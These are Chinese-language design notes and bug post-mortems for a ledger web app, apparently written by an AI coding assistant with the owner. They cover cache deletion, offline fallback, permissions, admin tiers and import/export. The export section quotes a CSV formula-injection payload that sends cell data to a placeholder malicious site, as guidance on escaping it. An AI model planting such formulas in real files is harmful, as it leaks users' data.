⚠️ **`403` 也算"不变"**：这个项目用 403 表示"你无权动这本账"，不是会话失效——**一个 403 就把人登出会是另一个 bug**。

**教训**：① **`catch { setUser(null) }` 这种写法本身就该被怀疑**——它把"我们不知道"写成了"答案是没有"；② **只有服务器有权结束会话**。够不着它的时候，正确答案是**沿用已知的**。

#### §3.3 ⚠️ "有数据"和"数据全了"是两件事

**问题**：所有者报告下载了数据，离线却看不到。
**根因**：`fetchInfiniteQuery` **只取第一页就 resolve**，而翻页是**页面**调 `fetchNextPage()` 触发的——**`QueryClient` 上根本没有这个方法**。所以"下载了一个月"实际只取了**第一页**。**更糟的是第二半**：**"已缓存"不等于"缓存全了"**——只要键下有**任何**数据它立刻返回，**所以曾经只缓存一页的月份，永远补不全**。

**修法**：自己写翻页循环；**"取完了"定义为"最后一页不再给 cursor"**。

**并且顺带发现一个同类问题**：**查询 key 由对象生成，而 `JSON.stringify` 会丢掉 `undefined` 的值**——所以 `{month, kind, categoryId}` 和 `{month, kind, categoryId, currency: undefined}` 是**不同的缓存条目**。**填充写四个字段、页面写三个**，于是**下载好的月份存在页面从不查询的键下面**。

**教训**：① **"有数据"和"数据全了"在缓存这一层长得一样**，必须显式判断完整性；② **凡是 key 由对象生成的地方，都要有一个唯一的构造函数**（`transactionFilters()`）；③ **`JSON.stringify` 丢 `undefined`** 是个容易忘的语言事实；④ **"缓存未命中"和"没下载"在界面上完全一样**——这类缺陷**必须靠测试**；⑤ **测试要断言"请求次数"**，不只是"条数"。**条数对但请求次数不对，说明分页仍然可疑。**

#### §3.4 ⚠️ 倒计时属于"事件"，不属于"订阅者"

**问题**：下载完成弹窗**每打开一个页面就重新出现一次**。
**根因**：**十秒是"组件"拥有的**——每次挂载都重新开始倒计时。
**修法**：把"刚下载完"记成**时间戳**，每个页面**从同一个事实算出同一个答案**：

> **"不到十秒前"在所有页面同时为真、同时为假。**

⚠️ **并且"是否还在显示"改成派生值，不再是状态**：存一个 `lingering` 布尔值就是同一事实的第二份拷贝，**而它正是会过期的那一份**。

**教训**：① **凡是"某件事之后 N 秒内显示"，时间点要记在事件上**；② **能从既有事实算出来的，不要另存一份**。

#### §3.5 ⚠️ "没有反馈"和"没有生效"是同一件事

**问题**：所有者三次报告"下载点了没反应"。**其中一次的真实情况**：下载**成功了**，但**进度条在完成的瞬间消失**——**看起来就像闪了一下**。

> **在按按钮的人看来，"没有反馈"和"没有生效"没有区别。**

**修法**：完成后**保留 10 秒**，并且**在所有页面显示**；按钮下方常驻一句说明。
**教训**：**"它工作了吗"这个问题，界面必须自己回答**，而不是靠用户去猜、也不是靠开发者读代码。

### §4 ⚠️ 当前未解决的问题

> **这一节是为了不把未解决的事写成已解决。**

#### §4.1 ✅ 已解决：下载按钮"没有反应"（2026-10-11 定位）

**所有者的诊断记录一次就定位了它**。日志长这样：

```
手动下载 — 月份：2026-10
开始 — 计划 1 个月
跳过（已完整） — 2026-10
```

**没有一行"取回"**——说明**它从来没去取过**。而**空间却在涨**。
**根因**：**缓存有两份，而删除只删了其中一份。**

| 副本 | 谁在写 |
|---|---|
| **内存中的 query cache** | 应用运行时用这个 |
| **IndexedDB 里的持久化 blob** | **TanStack 的持久化是单向的**：内存一变化就覆盖 blob |

**`forgetMonth` 与 `storedMonths` 读写的都是持久化 blob**，而**内存里的月份还在**。于是：① 用户删除十月 → **blob 里删了，内存里还在**；② 内存一有任何变化 → **把十月整月重新写回 blob**；③ 再点下载 → 程序看到"已完整" → **"跳过（已完整）"**；④ **而内存中的条目仍在按 staleTime 重取并写回** → **占用持续变大**。

> **一个用户删不掉的月份，和一个永远不会再发生的下载，是同一个 bug 的两个面。**

**修法**：`storedMonthsIn(queryClient)` 改问**活着的 query client**（只有它知道现在实际存了什么）；`forgetMonth(queryClient, month)` 走 `removeQueries`，**内存与持久化一起清**；**手动下载 = 强制重取**（见 §4.2）。

**教训**：① ⚠️ **有两份数据时，必须问清"哪一份是真的"。** 持久化副本是**历史的快照**，内存才是**当前状态**——而**写入方向决定了谁覆盖谁**；② **"删除不生效"和"下载不工作"可能是一个原因**，不要当成两个问题查；③ **诊断记录里"缺了某一行"和"多了某一行"一样有用**——这次的关键正是**没有"取回"这一行**。

#### §4.2 ✅ 已解决：手动下载被"已完整"挡住

**顺带发现**：即使删除正常了，"下载全部"在数据已存在时**也只会跳过**——因为"跳过已完整的"是**自动填充的正确行为**，却被用在了**用户主动点击**上。

| 调用者 | 行为 | 理由 |
|---|---|---|
| **自动** | 跳过已有的 | 这才让第二次启动几乎免费，也是它能无人值守的前提 |
| **手动** | **真的去取** | **按了按钮的人要的是"下载"，不是"状态报告"**；这也是**修复一个缓存错了的月份**的唯一办法 |

**修法**：`start(months, force)`，两个按钮都传 `force: true`。
**教训**：**"聪明地跳过"要用在没人看着的时候。** 有人按了按钮，就照他说的做。

#### §4.3 ✅ 已解决：占用持续增长（16 → 24 → 30MB）

**一半是正常的**：下载确实在发生，数据确实在进设备。
**一半是真问题**：**查询键的形状变过**（见 §3.3），**旧键下的条目永远不会被再读到，却一直占着空间**。

**修法**：下载管理页现在显示**存储明细**：

```
存储明细：缓存 1.2 MB，其中 61/180 条是当前版本会读的
[清理 119 条无效记录]
```

**教训**：**只增不减的存储，一定有一部分"谁也不再读它"。** 要能看见它，而不是等用户发现手机满了。

#### §4.3b ⚠️ 我引入过的一个破坏性缺陷（已修）

**所有者的反馈**：**"更新之后所有下载的具体数据都变成了 0 笔账单 0B，看起来似乎是把真正有用的数据删了而留下了一堆冗余数据。"**

**他没看错，是我干的。** 我加的"清理无效记录"用**内存中的 query cache** 判断"哪些是活的"，而**持久化缓存是异步恢复的**——**在恢复完成之前按按钮，内存是空的，六十个月全部被判为垃圾删掉**，而任何地方都没有备份。

> ⚠️ **破坏性操作，绝不能依赖"可能还没加载完"的东西。**

**修法**：把"什么算无效"改成**只看存储就能判断**的性质——条目是旧的，当且仅当它的 key 形状不是当前版本会写的形状。**不需要内存、不需要等恢复、不需要计时——而"不需要等待"正是它安全的原因。** 并且加了一道拒绝：**一条都没删掉时什么都不写**——**一次没有理由的重写，就是一次没有理由的数据损失机会。**

**教训**：① **"清理"这类功能，第一版必须假设自己的判据是错的**：问一句"如果这个判据失效，它会删掉什么"；② **异步恢复的缓存，在恢复完成前是空的，而"空"和"没有"长得一样**；③ **任何删除都要有一个"我不能删"的兜底条件。**

#### §4.3c 📌 44.5MB：已归因于浏览器，不再追查

**所有者的反馈**：**"它占了我设备44.5个MB的空间（至少显示是这样，不排除是显示数据显示错了的原因）。"**
**关键估算**：他那 60 个月的记录，JSON 序列化后**大约是 2MB**。44.5MB 是它的**二十多倍**——**这个差必须先解释，再谈修。**
**下载管理页现在列出最重的 8 条缓存条目**（标签里**连字段个数一起打印**，因为"四个字段还是三个字段"正是判断遗留条目的依据，而只打印值的话这一点看不见）。
**这是"让它可见"，不是"猜它是什么"**——读多少代码都得不出一份占用明细。

#### §4.4 ✅ 已真机确认：全部修好了（所有者 2026-10-11 确认）

> ⚠️ 这一节的标题曾经来回改过，最终以所有者的话为准（2026-10-11 晚）：
> > **"现在全部按钮事实上已经完全修好了，它只是还没有更新而已。"**
>
> **所以 §4.1（删除只删缓存一份）、§4.2（手动下载被"已完整"挡住）、§4.3（占用持续增长）三个缺陷全部关闭，且已由所有者确认可用。**
> ⚠️ **而我先前在这里写过一句"找不到真机确认记录，所以仍需再确认一次"——那句话现在是错的**。**教训是正面的：主人说"已经好了"就是有效证据**，不需要一份我自己签字的"真机记录"才算数。

**如果以后又不工作**，诊断记录已经能看到**完整的判断链条**——包括"是否强制"、"是否跳过"、"每次取回几页几条"，以及**最重的缓存条目是什么**。

> ⚠️ **4.5 离线看不到缓存之外的数据**：这一条的直接原因很可能就是 §4.3b——**数据被删了，离线时确实什么都没有**。**先点「下载全部」把数据取回来，再看这条是否仍然存在。多个症状可能共用一个原因，也可能不共用**——先修掉能确定的那个，再看剩下的还在不在。

#### §4.5b ✅ 已解决：离线读不到数据——**判据错了**

**所有者自己给出了正确的规则**：**"先去读网络数据，被拒绝/超过两秒没有收到数据然后直接改成用本地数据就可以了吧？"**

**修法前**：`if (isOffline()) 用本地`——**只在浏览器自报离线时才回退**。
**而手机在四种日常场景里都会报"在线"**：

| 场景 | `navigator.onLine` | 实际 |
|---|---|---|
| 电梯里 / 地铁里 | **true** | 请求不通 |
| 需要登录的 Wi-Fi（captive portal） | **true** | 请求被劫持 |
| 路由器停止转发的 Wi-Fi | **true** | 请求不通 |

**这四种情况下应用都会等、失败、什么都不显示——而设备上躺着一份完好的账本。**

> **要问的不是"浏览器以为我们在不在线"，而是"答案到了没有"。**

**修法**：`withLocalFallback()` —— **先试网络，任何失败（被拒 / 超时 / 服务器出错）都改用本地**；**2 秒上限**，因为**等待是用户的，回退是廉价的**（数据已经在设备上）。

**教训**：① **"环境告诉我可以"不等于"操作成功了"**。任何"先用 A，不行再用 B"的逻辑，**判据必须是 A 的结果，而不是 A 的前提**；② **`navigator.onLine` 只能用来"快速失败"，不能用来"决定是否尝试"**；③ **用户描述的规则往往比代码里的更准**——这一次他直接说出了正确的算法。

#### §4.5c ✅ 已澄清：账本只有 3 个月有数据

**所有者贴的日志**：2026-10 / 09 / 08 各取回 **61 / 39 / 38 条**，**其余 57 个月取回 0 条**。
**判断**：**那 57 个月本来就是空的**——**"取回 0 条"不是失败，是正确结果**。**下载一直是成功的；问题在读，不在下载**（他的直觉是对的）。

#### §4.5d 📌 52.5MB 与 127KB 的差：已解释，不再追查

**截图**：本机共占用 **52.5 MB**，而查询缓存只有 **127 KB**（**72/72 条全部有效**）。
**判断**：`navigator.storage.estimate()` 报的是**整个源**的数字，包含**浏览器替我们持有的东西**；而且 **Chrome 会把它可能还没落盘的数据也算进去**，所以这个数字可能跑在数据前面。
**修法**：下载管理页显示**占用构成**：

```
占用构成：账本数据 127 KB · 应用本体 X MB · 运行记录 X KB · 浏览器其它 X MB
```

**"其余是浏览器的账"必须说出来**——否则**账本会背上 52MB 的锅，而它只占 127KB**。
**教训**：**一个总数如果不拆开，就会被归因给最显眼的那个东西。**

### §5 已经做对、值得保持的做法

| 做法 | 为什么 |
|---|---|
| **存储层的每个操作报告失败而不抛错** | 隐私模式、被阻止的源、磁盘满都会让 IndexedDB 失败。应用**退化成"和这个文件不存在时一样"**——**一个会把程序弄坏的缓存，比没有缓存更糟** |
| **`maxAge` 设为 `Infinity`** | 缓存的**是用户自己的账本**，不存在哪一种"你自己的记录过期了"对他们有帮助。**"陈旧"该被说出来，不是删掉** |
| **`/api` 绝不在 Service Worker 里缓存** | 查询缓存已经拥有那些数据，懂陈旧语义，且登出时会清——**第二份副本既会分歧、又会在登出后存活**（隐私问题） |
| **登出先删本地、再打服务器** | **只在有网络时才能登出，那不叫登出**。而且**只删查询缓存、不删整个库**——**队列在同一个库里，删库会丢掉还没送到服务器的记账** |
| **本地统计与服务端算法逐条对齐，并共用 `fillSeriesGaps`** | 两份实现只要差一笔，用户就会**在线看一个数、离线看另一个数，且无从判断** |
| **通知只在有内容时显示** | 见 §2.3 |
| **界面的"取完没有"以数据为准**（最后一页无 cursor） | 见 §3.3 |
| ⭐ **用户要求"存在本地"的数据，有它自己的、只增不减的存储**（`ledger-months`） | **一个把内存视图整份写出去的持久化机制，会连带删掉它没提到的数据**（§1b） |
| ⭐ **界面读的值放在 React 之外，渲染时同步读**（`useSyncExternalStore`） | **没有排队的更新，就没有可丢的更新**（§1） |
| ⭐ **"存了的数"和"读到的数"分开报告** | **合并后的总数会掩盖要查的那个分歧** |
| ⭐ **破坏性操作串行化整个"读-改-写"，而不是只串行化写** | 只串行化写，两次读仍会基于同一份旧快照做决定 |

### §0 为什么会有这份文档

所有者原话：

协作是整个项目**最大的一块**，而且它会**改动数据模型与所有接口的入口**。所以在写任何代码之前，把决定逐条落下来，避免"边做边改方向"。

### §1 最重要的发现：**一个用户不再等于一本账**

现在的代码**硬假定"一个用户 = 一本账"**：

```ts
// 每一次接口调用都这样开始（24 个接口）
const bookId = await currentBookId(prisma, userId);   // 只给 userId，不给 bookId
```

也就是说：**所有接口都不接受"你要操作哪本账"这个参数**，因为它们认为你只有一本。而所有者要的是"一个人可以有多本账（私人的、公共的）"，所以：

| # | 要改的地方 | 规模 |
|---|---|---|
| 1 | 每个接口都要接受并校验 `bookId` | 24 个接口入口 + 全部权限判断 |
| 2 | 前端需要"当前账本"状态 | 现在没有这个概念 |
| 3 | **新增"开始页"** | 新页面 + 新路由 |
| 4 | `book_members.role` 真正生效 | 列已存在，**从未被检查** |
| 5 | 共享类型（`ledgerMetaResponseSchema` 等）要带上"账本 + 我的角色" | 共享包 |

### §2 页面与导航（KQ1、KQ2 已定）

#### §2.1 开始页

| 项 | 决定 |
|---|---|
| 什么时候进入 | **首次登录**（注册完成）**或主动点击左上角品牌名** |
| 平时登录进哪 | **上次使用的那本账**（服务器保存），直接进**明细页的展示态** |
| 开始页能看到什么 | 自己的**所有账本**（私人 + 被邀请的共享），可新建、可进入、可归档/退出 |
| 点账本 → | 看到该账本详情 → 点"编辑"进入 → **就是现在这整套界面** |
| 引导 | 要告诉用户"点品牌名可以回开始页"；账户页也加一个入口 |
| **当前账本是哪本** | **所有页面固定一小块显示**：`当前账本：XXX` |

> **为什么这样定很聪明**：绝大多数人只有一本账，于是他**永远不用看见开始页**，记账步数一步都不增加；而需要多本账的人有完整的入口。

- 品牌名（左上角）= 回开始页的入口；
- **所有页面**（除开始页与账户页）固定显示当前账本名；
- 服务器保存"上次使用的账本"，登录时直接进它。

### §3 账号编号与账本编号（KQ2 已定）

#### §3.1 ⚠️ 编号从"随机"改成"连续"——**代价已记录**

原设计是**随机八位数字**，理由是：编号公开、还要被用来搜人，**连续编号会让人能枚举所有账号**。所有者为了"**能提前把编号写在卡片上**"而改成连续。这个权衡是对的，**代价不隐藏**：

> **现在防枚举靠的是搜索限流，而不是编号本身的不可预测性。**

#### §3.2 编号区间（已实现）

| 区间 | 用途 |
|---|---|
| **10000000** | 所有者本人（naeor） |
| **10000001** | 现有第二个账号（mama） |
| **10000002 – 10000099** | **首批 98 个邀请码**（见 `docs/邀请码.md`，不入库），注册后即**管理员** |
| 10000100 | **跳过**（让两段序列一眼可辨） |
| **10000101 起** | 之后任何方式生成的邀请码，注册时由服务器依次分配 |

#### §3.3 并发安全：**原子计数器，而不是"提议 + 仲裁"**

所有者原本设想：客户端提一个号 → 服务器比对 → 撞了按到达时间排 → 再撞就随机给一个。**意图完全正确**（两个同时注册的人绝不能拿到同一个号），但实现上有一个**更简单的等价物**：

```sql
UPDATE "counters" SET "next" = "next" + 1
 WHERE "name" = 'account_number_direct'
RETURNING "next" - 1 AS "taken";     -- 一条语句，两个人不可能拿到同一个值
```

没有重试、没有仲裁、没有随机兜底；`users.account_number` 的**唯一索引**仍是最后一道保险。

#### §3.4 ⚠️ 实现中发现的一个真问题：**一个计数器不够**

**如果"发码预留"和"注册分配"共用一个计数器**，那么：批量发 98 个码会把计数器推到 `10000100`（**越过预留区间**），之后"没有邀请码"的注册就会落进 `10000100+`——**而那个区间正在被发放**。两个账号、同一个号。

**所以拆成两个**：

| 计数器 | 用途 |
|---|---|
| `account_number` | 发给**邀请码**的预留编号（码把它带走） |
| `account_number_direct` | **注册时直接分配**的编号 |

两个都只增不减，所以预留的号即使码没用也**永不复用**，两段序列也不可能相撞。

#### §3.5 账本编号（**待实现**）

所有者要求"每个账本也有全局统一独立编号"。已确定：**纯数字**，与账号编号同样的形式；**永久跟着账本**，账本被弃置后编号作废、不复用；**不能被用来搜索账本**（否则遍历编号就能发现别人的账本），它只用于"报出来对账"；实现方式与账号编号相同：`counters` 表里加一行 `book_number`。

> ❓ **待所有者确认**：账本编号的**起始值**？（账号用了 8 位；账本建议也用 8 位，例如从 `20000001` 起，这样一眼能分出"这是账号还是账本"。）
> **→ 该问题后来已定：从 `40000000` 开始**，见 §8 与 §9。

### §4 权限（KQ3、KQ4、KQ6 已定）

#### §4.1 两种角色，**取消 owner**

所有者决定：**取消 owner，只保留 editor 与 viewer**。

| 角色 | 能做 |
|---|---|
| **editor** | 记账与修改、**邀请他人**、**更改他人权限**；不能把自己降为 viewer（否则没人能改回来） |
| **viewer** | **看到的和 editor 完全一样**（账目、统计、明细），**唯一的区别是不能编辑** |

**服务端必须强制检查权限**——所有者特别强调：

> "即使 viewer 通过某种方式发起了更改，服务器的数据也不会被污染。"

> ⚠️ **一个必须先解决的问题**：`book_members.role` **目前被取出但从未使用**（`requireBookAccess` 是死代码）。所以**现在任何成员都能改任何账本**——这不是"将来要修"，而是**现在就是错的**。协作实现时第一件事就是让它生效。

#### §4.2 归档 / 退出（KQ4 已定）

| 动作 | 含义 |
|---|---|
| **归档** | 一个人一本账时使用。**服务器保留全部数据**、标记"**弃置**"，**客户端删除数据**，**普通用户再也看不到** |
| **退出** | 曾经多人时使用。**我只失去访问权，账本对其他人照常存在** |
| **编辑** | 账本详情里可改（如改名） |

**两条边界规则（已定）**：
1. **最后一个 editor 不能退出**——否则账本会变成没人能改的"死账"。要结束它，只能**由创建者删除整本**，或**先把别人设为 editor**。
2. **管理员能看弃置账本**：所有者要求"把首批 100 个编号内的账户标记为管理员，可以访问所有数据"。所以"没人能访问"指的是**普通用户**。实现上用 `users.is_admin`（**存储字段，不是按编号区间判断**——区间判断会把权限意外赠给将来落进该区间的人）。

### §6 离线与冲突（KQ 相关，所有者已定）

#### §6.1 范围：**"所有理论上能本地计算的都做"**

所有者原话要点：

> "我希望这个软件的**绝大部分功能都可以离线使用**，或者说它**最开始本来就是被设计成离线软件的**；服务器更多的是起到一个**数据备份**的作用。只是后续我发现作为网页端，把很多东西——比如 OCR 识别——**扔进服务器里会比在本地手机计算好太多**……所以**只要不涉及到需要太多算力的内容都尽可能做成本地就能完全实现**。"

| 功能 | 离线 |
|---|---|
| 记账、看历史、改、删 | ✅ **必须** |
| 统计（图表） | ✅ |
| 分类 / 支付方式 / 标签管理 | ✅ |
| **导出文件** | ✅ **做**，但要提醒用户"**导出的是本地记录，不一定靠谱**" |
| OCR 识别 | ❌ 依赖服务器（算力原因，所有者认可） |

#### §6.2 冲突：**提示用户选择，逐字段对比**

所有者要求：

> "把服务器里面的记录和用户本地的记录都摆出来，包括修改时间并**高亮冲突的具体内容**。只要发生了冲突就**记下冲突的内容、用户选择、时间等等并且保存到数据库中**。"

补充决定：**"高亮"就是把背景颜色换一下**，让它更显眼；冲突记录**只存服务器，不给客户端看**——所有者的判断是"这种东西没必要给客户看，但服务器多存点数据总没错：**一天 100 次冲突一年也就 4 万条，可能还没有 1MB**"。

所以需要新表 `sync_conflicts`，记录：设备、流水、两个版本的内容、用户选了哪个、时间。**没有客户端界面**——这与 PLAN §1.5 的原则一致（审计数据不上客户端界面）。

> ⚠️ **上面这一段已被 S8 第 3 轮推翻（2026-10-11 标注，原文保留）**
>
> | 这里写的 | 实际实现（S8 第 3 轮，已双真机确认） |
> |---|---|
> | 冲突记录**只存服务器，不给客户端看** | **必须给客户端看**——**"另一台设备报了什么"正是靠 `claims` 下发给每台设备，缺了它冲突界面一个候选都生不出来**（见 `教训.md` §8.12 与 `归档/S8-冲突-设计决定.md` §6.2） |
> | 表名 `sync_conflicts` | **`TransactionConflict`（未解决）+ `ConflictResolution`（裁定后的永久记录）** |
> | 没有客户端界面 | **有**——`apps/web/src/components/ConflictScreen.tsx` |
>
> **为什么当初会想错**：把"冲突记录"当成了**审计数据**（§1.5 说审计不上界面）。而它其实**不是审计，是用户此刻必须看到并做决定的信息**——**判据是"用户是否必须看到它"，不是"它存在哪张表里"。**
> **这一条值得记住**：**设计文档写在前、功能做在后时，"不该给用户看"的判断可能来自一个错误的类比。**

### §9 账本编号（**已实现 2026-10-10**）

#### §9.1 设计

| 项 | 决定 |
|---|---|
| **形式** | **8 位纯数字**，与账号编号一致 |
| **区间** | 账号 `10xxxxxx`、账本 `40xxxxxx`——**前两位不同，一眼可分**（所有者选 `40000000` 正是为此） |
| **分配** | 与账号编号**同一张 `counters` 表**、同一个原子计数器函数 |
| **可搜索吗** | ❌ **不能**。账本只能通过邀请加入，编号是**标签不是地址** |
| **永久性** | 跟着账本；账本被弃置后编号作废，**不复用** |

#### §9.2 已有账本的编号顺序

按**创建者的账号编号**排序 —— 所有者原话："**最前面的是我的帐本**"。所以 `naeor`（10000000）的账本拿到 `40000000`，`mama` 的拿到 `40000001`。

> **为什么不用 `created_at` 排序**：今天两者结果相同，但所有者明确说了"我的在最前面"，那就按**账号编号**排——它是所有者陈述过的顺序，而且**可复现**（同一份数据跑两次结果一样）。

#### §9.3 界面

- **明细页**：切换条上方一条小字 `当前账本：我的账本 40000000`，**两态都显示**；
- **「我的账本」页**：列出账本编号，并说明"编号用于核对，不能用来搜索"。

> ⚠️ **一个实现上的注意点**：这条小字**没有放进绿色区域**，而是放在切换条那一行的上方，且用绝对定位。原因：绿色区域的高度是**唯一被转场动画驱动的东西**，它的内边距是从真机量出来的；在里面加第二行，就必须同步改 `--hero-tall` / `--hero-short` 并在真机上重量一遍。放在这里则**任何形态下都不改变行高**（绝对定位不占位），因此不影响已调好的转场。

### §11 局域网先行（所有者的提议，**已确认可行**）

所有者问："我们是否可以用本地的局域网去模拟上线、开发？我自己还有几台设备。"
**可以，而且建议先这样做。** 现状已经支持：API 监听 `0.0.0.0:3000`、前端监听 `192.168.0.184:5173`（排查"网络连接异常"时已验证过）。

| 用途 | 怎么用 |
|---|---|
| 家人连着家里 WiFi | 手机浏览器打开 `http://192.168.0.184:5173` |
| **多设备测试** | 每台设备各注册一个账号 → 验证"多人同一本账" |
| 调试协作与冲突 | 局域网延迟低、可控，**比公网更适合调试** |

**三个限制必须知道**：

| 限制 | 影响 | 对策 |
|---|---|---|
| **只有同一个 WiFi 能用** | 家人回自己家就断 | 局域网**只用于测试**，长期仍要服务器 |
| **不是 HTTPS** | ⚠️ 浏览器禁用 **Service Worker / PWA**，离线能力**无法完整测试**（`crypto.randomUUID` 也在此列——已踩过） | S8 若要真机测离线，需自签证书或在 `localhost` 上测 |
| IP 会变 | 链接失效 | 测试时记当前 IP |

**结论**：**局域网测功能正确性，服务器测真实环境**（HTTPS、离线、中国大陆速度）。

### §12 管理员分级（**仅记录，不实现**）

> 所有者 2026-10-10 定。他自己的原话值得原样保留：
> > "**你看权利就是这么迷人，八字没一撇的事，我倒是先安排起每个人的权利了。**"

**只有 001–030 号被激活为管理员，其余账号一律**不是**管理员。**（所有者明确要求。）

⚠️ **本节是"计划"，不是"现状"。** 代码里现在只有一个布尔 `users.is_admin`，含义是"能看全部数据（含弃置账本）"。**下面这些角色与权限一个都还没实现**，写在这里是因为它决定了后续所有管理功能的形状，而**先想清楚谁该能做什么，比事后补权限便宜得多**。

#### §12.1 分级

| 编号 | 角色 | 权限 | 次数 / 配额限制 |
|---|---|---|---|
| **001** | **最高管理员**（所有者本人） | **全部权限**。另包括：**管理其他管理员的角色与权限配置**、**配置全量注册邀请码规则与开关** | 无限制 |
| **002–003** | **紧急恢复管理员** | ① **撤销其他较低级管理员的权限** ② **指定某个账号重新成为最高管理员** | 指定最高管理员**只能用 1 次**，用后自动失去该权限，**需要最高管理员恢复** |
| **004–010** | **平台运维管理员** | 查看各类日志与运营指标、处理异常同步任务、**管理邀请码是否可用**、**管理每个账号的次级邀请码配额** | 次级配额：**一周最多 10 次**，每次最多 **+1** 个配额<br>暂停/恢复账号登录：**一周最多 10 次**，每次最多 **100 个账号**（开与关都算一次） |
| **011–020** | **用户支持管理员** | 查看账号是否存在、是否被锁定、注册时间与状态；**重新发送邀请**或**撤销未使用的邀请**；**发起账号恢复申请** | 未定 |
| **021–030** | **运营管理员** | 管理**演示账号与演示数据**、创建测试样本与测试账号 | 未定 |

#### §12.2 为什么"配额"要写进设计

所有者给运维管理员设的限额有一个共同点：**它们都是"防止一次操作影响太多人"的上限**。

| 限额 | 防的是什么 |
|---|---|
| 次级邀请码配额 +1 / 次，10 次 / 周 | 防止一次给某个账号开很大的口子 |
| 暂停登录 ≤ 100 个账号 / 次，10 次 / 周 | 防止一次误操作把所有人挡在门外 |
| **开与关都算一次** | 否则"关掉再打开"可以绕过计数——这是一个容易漏掉的细节，所有者明确指出了 |

> **这组数字与"紧急恢复管理员只能指定一次最高管理员"是同一种设计**：高权限动作**要么次数有限，要么范围有限**，而且**用完需要更高一级来恢复**。这不是不信任，而是"一个账号被盗时，损失有上界"。

#### §12.3 与现有代码的差距（实现时要做的事）

| 要做 | 说明 |
|---|---|
| 角色表 | 现在的 `users.is_admin` 布尔不够。需要 `admin_role` 枚举 + 一张**审计表**记录每一次高权限动作（谁、何时、对谁、结果） |
| 配额计数 | 需要按"周"计数的表；周界用什么时区要定（建议 UTC，与其它审计一致） |
| **所有高权限动作都要记审计** | 撤销管理员、指定最高管理员、改配额、暂停账号——这些是**最需要事后追溯**的操作 |
| `001` 的唯一性 | "最高管理员"同时只能有一个，且**转移要留痕**（谁转给谁、何时） |
| 权限检查的位置 | 必须**在服务器**，且与 `book_members` 一样成为**唯一判据**——客户端传来的任何角色都不算数 |

> ⚠️ **一条实现原则（从 `book_members.role` 的教训来）**：`book_members.role` **被取出却从未检查**，导致"现在任何成员都能改任何账本"。**管理员角色绝不能再犯同一个错**——加字段的同时就要加检查，并且在测试里断言"低权限角色发起的动作被服务器拒绝"。

| **`last_book_id`** | 服务器保存"上次使用的账本"，登录直接进它 | `User.lastBookId String? @map("last_book_id") @db.Uuid`；关系 `lastBook Book? @relation("UserLastBook", ..., onDelete: SetNull)`；对方是 `Book.lastUsedBy User[] @relation("UserLastBook")` |
| **`disposed_at`** | **"弃置"**（所有者刻意选的词，不是"归档"）：**服务器保留全部数据**（不软删任何东西、不动任何流水）、**客户端删本地副本并停止显示**、**普通用户再也看不到**；管理员仍能恢复 | `Book.disposedAt DateTime? @map("disposed_at")`；注释明确 **"不叫 `deleted_at`，这不是命名偏好"**——"这本账还在不在"与"这一行被删了没有"是两个问题；并明确**与 `BookMember.leftAt` 是两件事** |
| **`left_at`** | **退出**：**我只失去访问权，账本对其他人照常存在**；**最后一个 editor 不能退出**；创建者不能退出自己的账本（那一半语义是"整本弃置"） | `BookMember.leftAt DateTime? @map("left_at")`；注释：**行保留不删**，于是它携带两个含义——**行存在 ⟶ 这个账号与这本账"曾经"有关系**；**`leftAt IS NULL` ⟹ 他现在是成员，而这是权限检查唯一能看的东西**；形状与流水的 tombstone 相同（保留行，让一个时间戳改变它的含义）；**重新加入是清掉这个时间戳，不是加一行** |

### §二 iOS 的导出体验（所有者第 1 条要求）

> 所有者原话：**"在苹果手机上下载一个东西跟分享一个东西本质上没什么区别"**。

| 平台 | 做法 |
|---|---|
| **支持 Web Share API 且能分享文件**（iPhone Safari 等） | 调 **原生分享菜单**——用户可选「存储到文件」、AirDrop、发给他 App |
| **不支持**（桌面浏览器、部分安卓浏览器等） | **普通文件下载** |

**实现纪律**：① **必须检测能力，不能假设**：`navigator.canShare?.({ files: [...] })` 为真才走分享 ✓；② **分享失败要能回退**：用户取消分享不是错误；**分享 API 抛异常时要退回下载**，不能什么都不发生 ✓；③ **两种路径都要给用户明确的完成反馈**，不能分享了却什么都不显示 ✓。

### §三 ⚠️ CSV / XLSX 公式注入（所有者第 3 条要求）

**这是安全问题，不是格式问题。**

**攻击方式**：如果备注里写了 `=HYPERLINK("http://恶意站/?x="&A1, "点我")`，导出的文件被 Excel 打开时**会被当作公式执行** ✗ 可以外泄数据、或诱导点击。

**必须以 `'` 前缀（或等效方式）转义所有以这些字符开头的单元格**：

```
=   +   -   @   Tab(0x09)   CR(0x0D)
```

**适用字段**：**一切用户可控的文本** —— 备注、分类名、支付方式名、标签名、账本名 ✓

**同时**：数值列要保持**真正的数字类型**（XLSX 里不能变成文本，否则求和失效）✗——所以**转义只作用于文本列**，不能一刀切 ✓

**测试必须覆盖**：每个危险字符开头的备注，导出后**不带前缀时仍是纯文本** ✓

### §四 ⚠️ 导入判重的作用域（所有者第 4 条要求）

> 所有者原话：**"不要直接把外部文件中的 UUID 无条件当作新流水主键"**。

**错误做法（两种）**：

| 做法 | 为什么错 |
|---|---|
| 拿文件里的 UUID **当新流水的 `id`** | 外部文件的主键**不受我们控制**，可能与其他账本/其他用户冲突，也可能被伪造 ✗ |
| 只按 UUID **全局判重** | 用户把同一份文件导入**另一个账本**时，会被**错误跳过** ✗ |

**正确做法**：

| 项 | 设计 |
|---|---|
| **新流水的主键** | **我们自己生成**（客户端 UUID v7，与现有录入路径一致）✓ |
| **文件里的 UUID** | 存进一个**单独的列**，例如 `source_ref`（来源引用），**仅作参考** ✓ |
| **唯一约束** | `@@unique([bookId, sourceRef])` —— **作用域是账本** ✓✓ |
| 效果一 | **同一文件重复导入同一账本 → 幂等，不产生重复** ✓ |
| 效果二 | **同一文件导入另一个账本 → 正常写入，不会被跳过** ✓ |
| 文件里**没有** UUID（外部来源的 CSV） | `source_ref` 存 `null` ✓ 此时**不做判重**，按新流水写入 ✓（并提示用户可能存在重复） |

> **一句话**：**判重是"这个账本里有没有这条来源记录"，不是"这个 UUID 存不存在"。**

**✅ 已落地（2026-10-10）**：`source_ref` 列与 `@@unique([bookId, sourceRef])` 已在 schema 和迁移里。

### §五 导出审计：只记"发生过什么"，不记"内容"（所有者第 5 条要求）

> 所有者原话：**"只保存必要的审计信息，不保存完整导出文件或流水内容"**。

**记**：谁、何时、导出范围（月份区间 / 收支 / 分类 / 币种）、**条数**、**格式**、**文件编号**
**不记**：导出的每一条流水、文件内容、文件本体 ✓

